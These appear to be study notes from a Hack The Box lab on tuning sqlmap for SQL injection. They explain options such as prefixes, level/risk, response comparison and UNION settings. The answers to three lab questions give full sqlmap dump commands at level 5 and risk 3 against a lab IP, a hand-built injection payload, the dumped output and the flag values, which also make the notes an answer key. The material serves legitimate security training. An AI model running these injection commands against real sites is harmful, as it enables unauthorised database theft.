# Attack Tuning
## Prefix/Suffix

```shellsession
$ sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"
```

## Level/Risk
- The option `--level` (`1-5`, default `1`) extends both vectors and boundaries being used, based on their expectancy of success (i.e., the lower the expectancy, the higher the level).
- The option `--risk` (`1-3`, default `1`) extends the used vector set based on their risk of causing problems at the target side (i.e., risk of database entry loss or denial-of-service).

## Advanced Tuning
### Status Codes
If the difference between `TRUE` and `FALSE` responses can be seen in the HTTP codes (e.g. `200` for `TRUE` and `500` for `FALSE`), the option `--code` could be used to fixate the detection of `TRUE` responses to a specific HTTP code (e.g. `--code=200`).

### Titles
If the difference between responses can be seen by inspecting the HTTP page titles, the switch `--titles` could be used to instruct the detection mechanism to base the comparison based on the content of the HTML tag `<title>`.

### Strings
In case of a specific string value appearing in `TRUE` responses (e.g. success), while absent in `FALSE` responses, the option `--string` could be used to fixate the detection based only on the appearance of that single value (e.g. `--string=success`).

### Text-only
When dealing with a lot of hidden content, such as certain HTML page behaviors tags (e.g. `<script>`, `<style>`, `<meta>`, etc.), we can use the `--text-only` switch, which removes all the HTML tags, and bases the comparison only on the textual (i.e., visible) content.

### Techniques
For example, if we want to skip the time-based blind and stacking SQLi payloads and only test for the boolean-based blind, error-based, and UNION-query payloads, we can specify these techniques with `--technique=BEU`.

### UNION SQLi Tuning
If we can manually find the exact number of columns of the vulnerable SQL query, we can provide this number to SQLMap with the option `--union-cols` (e.g. `--union-cols=17`). In case that the default "dummy" filling values used by SQLMap -`NULL` and random integer- are not compatible with values from results of the vulnerable SQL query, we can specify an alternative value instead (e.g. `--union-char='a'`).

Furthermore, in case there is a requirement to use an appendix at the end of a UNION query in the form of the `FROM <table>` (e.g., in case of Oracle), we can set it with the option `--union-from` (e.g. `--union-from=users`).

## Questions 
1. What's the contents of table flag5? (Case #5) **Answer: HTB{700_much_r15k_bu7_w0r7h_17}**
   - The `TRUE` and `FALSE` response differs base on the text content:
        ```shellsession
        $ sqlmap -u 'http://154.57.164.79:30101/case5.php?id=1*' --text-only --batch --level 5 --risk 3 --threads 10 -T flag5 --dump
        <SNIP>
        Database: testdb
        Table: flag5
        [1 entry]
        +----+---------------------------------+
        | id | content                         |
        +----+---------------------------------+
        | 1  | HTB{700_much_r15k_bu7_w0r7h_17} |
        +----+---------------------------------+
        <SNIP>
        ```
2. What's the contents of table flag6? (Case #6) **Answer: HTB{v1nc3_mcm4h0n_15_4570n15h3d}**
   - This SQL query yields a TRUE response: http://154.57.164.79:30101/case6.php?col=id`)--+
   - Feed this prefix `) into sqlmap:
        ```shellsession
        $ sqlmap -u 'http://154.57.164.79:30101/case6.php?col=id*' --text-only --batch --level 5 --risk 3 --threads 10 -T flag6 --dump --prefix="\`)"
        <SNIP>
        Database: testdb
        Table: flag6
        [1 entry]
        +----+----------------------------------+
        | id | content                          |
        +----+----------------------------------+
        | 1  | HTB{v1nc3_mcm4h0n_15_4570n15h3d} |
        +----+----------------------------------+
        <SNIP>
        ```
3. What's the contents of table flag7? (Case #7) **Answer: HTB{un173_7h3_un173d}**
   - Specify UNION based technique with 5 columns and string as the value for the injection:
        ```shellsession
        $ sqlmap -u 'http://154.57.164.79:30101/case7.php?id=1*' --text-only --batch --level 5 --risk 3 --threads 10 --technique=U --union-cols=5 --union-char='a' -T flag7 --dump
        <SNIP>
        Database: testdb
        Table: flag7
        [1 entry]
        +----+-----------------------+
        | id | content               |
        +----+-----------------------+
        | 1  | HTB{un173_7h3_un173d} |
        +----+-----------------------+
        <SNIP>
        ```